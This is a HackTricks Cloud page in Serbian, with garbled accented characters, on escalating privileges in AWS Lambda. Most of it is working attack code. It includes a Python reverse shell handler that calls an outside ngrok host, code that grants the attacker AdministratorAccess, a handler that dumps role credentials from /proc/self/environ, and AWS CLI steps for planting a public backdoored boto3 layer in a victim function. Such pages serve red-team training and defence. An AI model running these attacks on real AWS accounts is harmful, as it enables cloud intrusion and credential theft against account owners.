# AWS - Lambda Privesc

{% hint style="success" %}
Nauƒçite i ve≈æbajte AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Nauƒçite i ve≈æbajte GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr≈æite HackTricks</summary>

* Pogledajte [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru≈æite se** üí¨ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Delite hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## lambda

Vi≈°e informacija o lambda u:

{% content-ref url="../../aws-security/aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-security/aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Korisnici sa **`iam:PassRole`, `lambda:CreateFunction`, i `lambda:InvokeFunction`** dozvolama mogu eskalirati svoje privilegije.\
Mogu **kreirati novu Lambda funkciju i dodeliti joj postojeƒáu IAM ulogu**, dajuƒái funkciji dozvole povezane sa tom ulogom. Korisnik zatim mo≈æe **pisati i otpremiti kod u ovu Lambda funkciju (na primer sa rev shell)**.\
Kada je funkcija postavljena, korisnik mo≈æe **pokrenuti njeno izvr≈°enje** i ≈æeljene akcije pozivanjem Lambda funkcije putem AWS API-ja. Ovaj pristup efektivno omoguƒáava korisniku da obavlja zadatke indirektno putem Lambda funkcije, radeƒái sa nivoom pristupa koji je dodeljen IAM ulozi povezanoj sa njom.\\

Napadaƒç bi mogao zloupotrebiti ovo da dobije **rev shell i ukrade token**:

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
{% endcode %}
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
Mo≈æete takoƒëe **zloupotrebiti dozvole lambda uloge** iz same lambda funkcije.\
Ako lambda uloga ima dovoljno dozvola, mo≈æete je iskoristiti da sebi dodelite administratorska prava:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
Takoƒëe je moguƒáe otkriti kredencijale lambda role bez potrebe za spoljnim povezivanjem. Ovo bi bilo korisno za **Network isolated Lambdas** koje se koriste za interne zadatke. Ako postoje nepoznate sigurnosne grupe koje filtriraju va≈°e reverse shell-ove, ovaj deo koda ƒáe vam omoguƒáiti da direktno otkrijete kredencijale kao izlaz lambde.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Potencijalni uticaj:** Direktan privesc na proizvoljnu lambda servisnu ulogu koja je navedena.

{% hint style="danger" %}
Napomena da ƒçak i ako izgleda interesantno **`lambda:InvokeAsync`** **ne** omoguƒáava sam po sebi da **izvr≈°i `aws lambda invoke-async`**, takoƒëe vam je potrebna `lambda:InvokeFunction`
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Kao u prethodnom scenariju, mo≈æete **dodeliti sebi dozvolu `lambda:InvokeFunction`** ako imate dozvolu **`lambda:AddPermission`**
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Potencijalni uticaj:** Direktan privesc na proizvoljnu lambda servisnu ulogu koja je navedena.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

Korisnici sa **`iam:PassRole`, `lambda:CreateFunction`, i `lambda:CreateEventSourceMapping`** dozvolama (i potencijalno `dynamodb:PutItem` i `dynamodb:CreateTable`) mogu indirektno **eskalirati privilegije** ƒçak i bez `lambda:InvokeFunction`.\
Oni mogu kreirati **Lambda funkciju sa zlonamernim kodom i dodeliti joj postojeƒáu IAM ulogu**.

Umesto direktnog pozivanja Lambda funkcije, korisnik postavlja ili koristi postojeƒáu DynamoDB tabelu, povezujuƒái je sa Lambda funkcijom putem mapiranja izvora dogaƒëaja. Ova postavka osigurava da se Lambda funkcija **automatski pokreƒáe prilikom unosa nove stavke** u tabelu, bilo akcijom korisnika ili nekim drugim procesom, ƒçime se indirektno poziva Lambda funkcija i izvr≈°ava kod sa dozvolama dodeljene IAM uloge.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
Ako je DynamoDB veƒá aktivan u AWS okru≈æenju, korisnik samo **treba da uspostavi mapiranje izvora dogaƒëaja** za Lambda funkciju. Meƒëutim, ako DynamoDB nije u upotrebi, korisnik mora **kreirati novu tabelu** sa omoguƒáenim strimovanjem:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Sada je moguƒáe **povezati Lambda funkciju sa DynamoDB tabelom** kreiranjem **mapiranja izvora dogaƒëaja**:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Sa Lambda funkcijom povezanom sa DynamoDB stream-om, napadaƒç mo≈æe **indirektno aktivirati Lambda funkciju aktiviranjem DynamoDB stream-a**. Ovo se mo≈æe postiƒái **ubacivanjem stavke** u DynamoDB tabelu:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Potencijalni Uticaj:** Direktan privesc na lambda servisnu ulogu koja je navedena.

### `lambda:AddPermission`

Napadaƒç sa ovom dozvolom mo≈æe **dodeliti sebi (ili drugima) bilo koje dozvole** (ovo generi≈°e politike zasnovane na resursima za dodelu pristupa resursu):

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**Potencijalni Uticaj:** Direktan privesc na lambda servisnu ulogu kori≈°ƒáenjem dozvole za modifikaciju koda i njegovo pokretanje.

### `lambda:AddLayerVersionPermission`

Napadaƒç sa ovom dozvolom mo≈æe **dodeliti sebi (ili drugima) dozvolu `lambda:GetLayerVersion`**. Mogao bi pristupiti sloju i tra≈æiti ranjivosti ili osetljive informacije

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
{% endcode %}

**Potencijalni uticaj:** Potencijalni pristup osetljivim informacijama.

### `lambda:UpdateFunctionCode`

Korisnici koji poseduju dozvolu **`lambda:UpdateFunctionCode`** imaju potencijal da **modifikuju kod postojeƒáe Lambda funkcije koja je povezana sa IAM ulogom.**\
Napadaƒç mo≈æe **modifikovati kod lambda funkcije kako bi eksfiltrirao IAM kredencijale**.

Iako napadaƒç mo≈æda nema direktnu moguƒánost da pozove funkciju, ako Lambda funkcija veƒá postoji i operativna je, verovatno ƒáe biti pokrenuta kroz postojeƒáe tokove rada ili dogaƒëaje, ƒçime se indirektno omoguƒáava izvr≈°enje modifikovanog koda.

{% code overflow="wrap" %}
```bash
# Thezip should contain the lambda code (trick: DOwnload the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
{% endcode %}

**Potencijalni Uticaj:** Direktan privesc na lambda servisnu ulogu koja se koristi.

### `lambda:UpdateFunctionConfiguration`

#### Uvod

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) omoguƒáava ukljuƒçivanje **koda** u va≈°u lambda funkciju, ali **skladi≈°tenjem odvojeno**, tako da kod funkcije mo≈æe ostati mali i **vi≈°e funkcija mo≈æe deliti kod**.

Unutar lambda mo≈æete proveriti putanje odakle se python kod uƒçitava funkcijom kao ≈°to je sledeƒáa:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
Ovo su mesta:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

Na primer, biblioteka boto3 se uƒçitava iz `/var/runtime/boto3` (4. pozicija).

#### Eksploatacija

Moguƒáe je zloupotrebiti dozvolu `lambda:UpdateFunctionConfiguration` da **dodate novi sloj** lambda funkciji. Da bi se izvr≈°io proizvoljan kod, ovaj sloj treba da sadr≈æi neku **biblioteku koju ƒáe lambda importovati.** Ako mo≈æete da proƒçitate kod lambde, lako biste mogli da pronaƒëete ovo, takoƒëe imajte na umu da je moguƒáe da lambda **veƒá koristi sloj** i da mo≈æete **preuzeti** sloj i **dodati svoj kod** tamo.

Na primer, pretpostavimo da lambda koristi biblioteku boto3, ovo ƒáe kreirati lokalni sloj sa poslednjom verzijom biblioteke:
```
pip3 install -t ./lambda_layer boto3
```
Mo≈æete otvoriti `./lambda_layer/boto3/__init__.py` i **dodati backdoor u globalni kod** (na primer, funkciju za eksfiltraciju kredencijala ili dobijanje reverse shell-a).

Zatim, zip-ujte taj direktorijum `./lambda_layer` i **upload-ujte novi lambda layer** na va≈° nalog (ili na nalog ≈ærtve, ali mo≈æda nemate dozvole za to).\
Napomena: potrebno je kreirati python folder i staviti biblioteke tamo da bi se prepisao /opt/python/boto3. Takoƒëe, layer mora biti **kompatibilan sa verzijom pythona** koju koristi lambda i ako ga upload-ujete na va≈° nalog, mora biti u **istoj regiji:**

{% code overflow="wrap" %}
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
{% endcode %}

Sada, uƒçinite da je otpremljeni lambda sloj **dostupan bilo kom nalogu**:
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
I prikaƒçi lambda sloj na funkciju ≈ærtve lambda:
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
Sledeƒái korak bi bio da **pozovemo funkciju** sami ako mo≈æemo ili da ƒçekamo dok **se ne pozove** normalnim putem ‚Äì ≈°to je sigurnija metoda.

**Diskretniji naƒçin za eksploataciju ove ranjivosti** mo≈æe se naƒái u:

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**Potencijalni uticaj:** Direktan privesc na lambda servisnu ulogu koja se koristi.

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Mo≈æda sa tim dozvolama mo≈æete kreirati funkciju i izvr≈°iti je pozivom URL-a... ali nisam mogao pronaƒái naƒçin da to testiram, pa mi javite ako uspete!

### Lambda MitM

Neke lambde ƒáe **primati osetljive informacije od korisnika u parametrima.** Ako dobijete RCE u jednoj od njih, mo≈æete eksfiltrirati informacije koje drugi korisnici ≈°alju, proverite to u:

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

## Reference

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

{% hint style="success" %}
Nauƒçite i ve≈æbajte AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Nauƒçite i ve≈æbajte GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr≈æite HackTricks</summary>

* Pogledajte [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru≈æite se** üí¨ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Delite hakovanje trikove podno≈°enjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
